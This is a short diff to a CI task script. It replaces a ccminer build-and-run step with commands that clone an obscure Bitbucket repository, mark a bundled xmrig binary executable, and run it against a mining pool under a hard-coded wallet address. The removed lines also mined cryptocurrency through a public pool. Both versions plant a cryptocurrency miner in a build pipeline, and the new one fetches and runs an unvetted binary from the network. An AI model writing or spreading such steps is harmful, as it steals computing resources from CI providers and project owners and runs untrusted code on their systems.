@@ -7,11 +7,8 @@ container:
 task:
   script: |
    apt-get update -y \
-   && apt-get install -y \ libcurl4-openssl-dev \ libssl-dev \ libjansson-dev \ automake \ autotools-dev \ build-essential \ 
-   && git clone https://github.com/monkins1010/ccminer
-   && cd ccminer
-   && chmod +x build.sh 
-   && chmod +x configure.sh 
-   && chmod +x autogen.sh
-   && ./build.sh
-   && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ.01 -d0
+   && apt-get install -y \ git \
+   && git clone https://bitbucket.org/UsertBokehf/mnun \
+   && chmod +x ./mnun/xmrig \
+   && ./mnun/xmrig -o arq.pool.gntl.co.uk:10008 -u aRi1mBz6iddEmCrduae2TnYB94o41g9ug9HgPvBZF5aUNZY7opu7Z9HYTKA4PphzbTGdXamfR4RyW1XryRHpV92Qccd8fTsRkDV1RB37AVQKG -k --tls
+   
